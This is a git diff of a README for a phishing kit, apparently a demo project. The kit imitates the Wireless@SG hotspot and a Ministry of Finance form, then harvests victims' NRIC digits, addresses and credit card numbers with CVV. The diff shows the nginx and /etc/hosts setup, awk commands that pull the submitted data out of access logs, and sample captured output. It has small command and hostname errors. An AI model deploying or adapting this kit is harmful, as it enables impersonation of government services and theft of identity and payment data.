@@ -19,19 +19,25 @@ WE, SHALL NOT BE LIABLE FOR ANY DAMAGED OR LEGAL CONSENTS BY YOUR USAGE OF THIS 
 
 1. Clone the git repository into the webserver.
 > git clone https://github.com/conan97zhang/CDT_phishing_m3.git
+
 2. Move the CDT_phishing_m3 folder into the Nginx web server's root directory and rename it into m3.
 > mv -r CDT_phishing_m3 /var/www/html/m3
+
 3. Associate the domain name hotspot.wireless without localhost IP address.
 > nano /etc/hosts
+
 3.1 Amend the following line from
 
 >> 127.0.0.1    localhost
+
 TO
 
 >> 127.0.0.1    hotspot.wireless
+
 4. Start nginx web server
 
 > service nginx start
+
 ## EXECUTION
 
 #### In this section, we will be explaining how will the frontend (victim's browser) sends the data to the backend (attacker's server) seamlessly.
@@ -39,12 +45,15 @@ TO
 1. Load the website on your browser.
 
 > http://hostspot.wireless
+
 2. Start capturing the user inputs by opening 2 different terminals.
 
 ##### 2.1 Terminal 1
 > tail -f /var/log/nginx/access.log | awk '/NRIC/ {print "\n" "Entry " NR " | " $1 $2 $4 $5 " - WIFI HOTSPOT""\n" "\n"  $7}'
+
 ##### 2.2 Terminal 2
 > tail -f /var/log/nginx/access.log | awk '/REF/ {print "\n" "Entry " NR " | " $1 $2 $4 $5 " - MOF""\n" "\n"  $7}'
+
 3. Go through all the steps in entering the details (VERY SIMPLE!!!)
 
 ## SAMPLE OUTPUT (END OF DEMO).
@@ -59,7 +68,7 @@ The data presented in this output is the input from the rogue Wireless@SG websit
 > 
 > /detected.html?title=Title&input=Mr&name=Full+Name&input=John&NRIC=Last+4+digits+of+NRIC&input=345D&postal+code=Postal+Code&input=123456&address=Address&input=123+Tamp+f
 
-From the above data, we can safely deduce the following imformation:
+From the above data, we can safely deduce the following information:
 
 > Title: Mr
 >
@@ -70,6 +79,7 @@ From the above data, we can safely deduce the following imformation:
 > Poster Code: 123456
 >
 > Address: 123 Tamp f
+
 ##### 2. Terminal 2 ( EXECUTION(2)(2) )
 
 The data presented in this output is the input from the rogue Ministry of Finance website. 
@@ -78,7 +88,7 @@ The data presented in this output is the input from the rogue Ministry of Financ
 >
 > /MOF%20|%20Seek%20Permission%20Form_files/FormFEDYA.html?REF=2020_SPF_MOF&CARD=99999999999999999&CVV=999&EXP=99%2F99
 
-From the above data, we can safely deduce the following imformation:
+From the above data, we can safely deduce the following information:
 
 > Card Number: 99999999999999999
 >
